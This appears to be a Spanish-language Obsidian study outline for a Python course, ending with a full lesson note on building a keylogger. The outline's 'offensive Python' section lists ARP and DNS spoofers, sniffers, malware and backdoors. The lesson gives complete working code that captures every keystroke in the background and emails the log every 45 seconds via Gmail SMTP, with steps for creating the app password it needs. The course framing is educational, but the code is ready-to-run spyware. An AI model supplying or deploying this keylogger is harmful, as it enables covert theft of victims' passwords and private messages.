# 📁 0. Introducción a Python

### 0.1 Historia y filosofía de Python

### 0.2 Características y ventajas

### 0.3 Diferencias Python2/3, PIP

→ **Carpeta muy pequeña.**

---

# 📁 1. Conceptos Básicos de Python

Cada vídeo = una nota.

### 1.1 Intérprete

### 1.2 Shebang y convenios

### 1.3 Variables y tipos de datos

### 1.4 Operadores

### 1.5 String Formatting

### 1.6 Control de flujo

### 1.7 Funciones y ámbito

### 1.8 Funciones lambda

### 1.9 Excepciones

### 1.10 Cuestionario _(opcional escribir)_

> ⭐ Carpeta imprescindible, base del resto.

---

# 📁 2. Colecciones y Estructuras de Datos

### 2.1 Listas

### 2.2 Tuplas

### 2.3 Conjuntos

### 2.4 Diccionarios

### 2.5 Proyecto videojuegos _(si quieres, en subcarpeta)_

### 2.6 Cuestionario

---

# 📁 3. Programación Orientada a Objetos (POO)

Aquí te recomiendo **una nota por vídeo**, es grande:

### 3.1 Clases y objetos (1)

### 3.2 Clases y objetos (2)

### 3.3 Métodos estáticos / de clase

### 3.4 self explicado

### 3.5 Herencia y polimorfismo

### 3.6 Encapsulamiento / métodos especiales

### 3.7 Decoradores y properties

### 3.8 Cuestionario

---

# 📁 4. Módulos y Paquetes

### 4.1 Organización en módulos

### 4.2 Importación

### 4.3 Creación y distribución paquetes

### 4.4 Cuestionario

---

# 📁 5. Entrada y Salida de Datos

### 5.1 input() / print()

### 5.2 Archivos (open, read, write…)

### 5.3 Manipulación de texto

### 5.4 Cuestionario


---

# 📁 7. Biblioteca Estándar y Herramientas

### 7.1 Fechas y horas

### 7.2 Expresiones regulares

### 7.3 Archivos y directorios

### 7.4 Conexiones de red (1)

### 7.5 Conexiones de red (2)

### 7.6 Conexiones de red (3)

### 7.7 Conexiones de red (4)

### 7.8 Cuestionario

---

# 📁 8. Librerías Comunes

### 8.1 os / sys

### 8.2 requests (1)

### 8.3 requests (2)

### 8.4 urllib3

### 8.5 threading y multiprocessing

### 8.6 Cuestionario

---

# 📁 9. Desarrollo de Aplicaciones de Escritorio

**Gran sección → separar mucho.**

### 9.1 Introducción GUI

### 9.2 Tkinter (1)

### 9.3 Tkinter (2)

### 9.4 Tkinter (3)

### 9.5 Tkinter (4)

### 9.6 Tkinter (5)

### 9.7 Tkinter (6)

### 9.8 Tkinter (7)

### 9.9 Tkinter (8)

### 9.10 CustomTkinter

### Chat Multiusuario E2E

- 9.11 (1)
    
- 9.12 (2)
    
- 9.13 (3)
    
- 9.14 (4)
    
- 9.15 (5)
    

### 9.16 Cuestionario

---

# 📁 10. Python Ofensivo (la parte buena 😈)

Aquí te recomiendo **separar por herramientas**, muy limpio para Obsidian.

### 🕷 10.1 Previo a la explotación

### 🔎 10.2 Port Scanner

- (1) teoría
    
- (2) sockets
    
- (3) escaneo paralelo
    
- (4) versión final
    

### 🖥 10.3 MAC Changer

### 🌐 10.4 ICMP Net Scanner

### 🌐 10.5 ARP Scanner (Scapy)

### 🧪 10.6 ARP Spoofer (MITM)

### 🎯 10.7 DNS Sniffer

### 📝 10.8 HTTP Sniffer

### 🔒 10.9 HTTPS Sniffer (mitmdump)

### 🖼 10.10 HTTPS Image Sniffer

### 🎭 10.11 DNS Spoofer (NetfilterQueue)

### 🚦 10.12 Traffic Hijacking

### ⌨ 10.13 Keylogger (1)

### ⌨ 10.14 Keylogger (2)

### 💀 10.15 Malware (1)

### 💀 10.16 Malware (2)

### 🔗 10.17 Backdoors (1)

### 🔗 10.18 Backdoors (2)

### 🧬 Forward Shell

- 10.19 (1)
    
- 10.20 (2)
    
- 10.21 (3)
    
- 10.22 (4)
    

---

# 📁 11. Recursos / Extras

- Cheatsheets
    
- Plantilla scripts
    
- Comandos Linux comunes
    
- Snippets Scapy
    
- Snippets sockets
    
- Snippets argparse










---

# **📌 10.13 — Keylogger en Python (pynput + email)**

## ✔️ Introducción

Un keylogger es un software diseñado para capturar las pulsaciones del teclado y almacenarlas o enviarlas de manera remota.  
En entornos de seguridad ofensiva, esta técnica permite estudiar cómo se comportan ciertos sistemas frente a la monitorización del input del usuario.

En este tema se construye un keylogger modular en Python capaz de:

- Registrar cualquier tecla pulsada
    
- Reportar periódicamente las pulsaciones por email
    
- Ejecutarse en segundo plano
    
- Apagarse de forma controlada
    

---

# **🧱 Arquitectura del Keylogger**

El diseño se basa en tres bloques:

|Componente|Función|
|---|---|
|**Captura en segundo plano**|Listener que permanece activo sin mostrar ventana ni interacción visible.|
|**Registro de pulsaciones**|Convierte caracteres y teclas especiales en texto estructurado.|
|**Sistema de reporting**|Envía periódicamente el contenido capturado mediante email.|

Para realizar el envío automático es necesario usar una contraseña de aplicación del proveedor de correo (por ejemplo, Gmail → “Contraseñas de aplicación”).

---

# **📚 Dependencias necesarias**

```bash
pip install pynput
pip install termcolor
```

---

# **🧩 keylogger.py**

Código totalmente corregido:

```python
#!/usr/bin/env python3

import pynput.keyboard
import threading
import smtplib
from email.mime.text import MIMEText


class Keylogger:
    def __init__(self, interval, sender, recipients, password):
        self.log = ""
        self.interval = interval
        self.sender = sender
        self.recipients = recipients
        self.password = password

        self.request_shutdown = False
        self.timer = None

    def pressed_key(self, key):
        try:
            self.log += key.char

        except AttributeError:
            name = str(key).split(".")[-1].capitalize()
            if name == "Space":
                self.log += " "
            else:
                self.log += f" [{name}] "

        print(self.log)

    def send_email(self, subject, body):
        msg = MIMEText(body)
        msg["Subject"] = subject
        msg["From"] = self.sender
        msg["To"] = ", ".join(self.recipients)

        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(self.sender, self.password)
            smtp.sendmail(self.sender, self.recipients, msg.as_string())

        print("\n[+] Email enviado correctamente!\n")

    def report(self):
        if self.log:
            self.send_email("Keylogger Report", self.log)

        self.log = ""

        if not self.request_shutdown:
            self.timer = threading.Timer(self.interval, self.report)
            self.timer.start()

    def shutdown(self):
        self.request_shutdown = True
        if self.timer:
            self.timer.cancel()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)

        with keyboard_listener:
            self.report()
            keyboard_listener.join()
```

---

# **🧩 main.py**

Código corregido:

```python
#!/usr/bin/env python3

from keylogger import Keylogger
from termcolor import colored
import signal
import os


def def_handler(sig, frame):
    print(colored("\n[!] Saliendo...\n", "red"))
    my_keylogger.shutdown()
    os._exit(1)


signal.signal(signal.SIGINT, def_handler)


if __name__ == '__main__':
    # Configuración
    sender = "tucorreo@gmail.com"
    recipients = ["tucorreo@gmail.com"]
    password = "XXXX XXXX XXXX"  # Contraseña de aplicación
    interval = 45                # segundos

    my_keylogger = Keylogger(interval, sender, recipients, password)
    my_keylogger.start()
```

---

# **🔐 Contraseñas de aplicación (Gmail)**

Para que Python pueda enviar correos:

1. Activar verificación en dos pasos.
    
2. Abrir → _Contraseñas de aplicación_.
    
3. Crear una nueva app (por ejemplo “Keylogger”).
    
4. Copiar la contraseña generada.
    

Esa es la que se usa en la variable `password`.

---

# **📁 ¿Qué va en los apuntes y qué va en archivos?**

📌 **Lo ideal es esto:**

### **En los apuntes**

- Explicación del funcionamiento
    
- Arquitectura
    
- Qué hace cada parte (listener, reporting, email)
    
- Pasos para generar la contraseña de aplicación
    
- Estructura de carpetas
    
- Explicación del flujo
    

### **En archivos separados `.py`**

- `keylogger.py`
    
- `main.py`
    

➡️ Los scripts completos es mejor dejarlos fuera para no ensuciar mucho tu GitHub y mantener apuntes limpios y fáciles de leer.
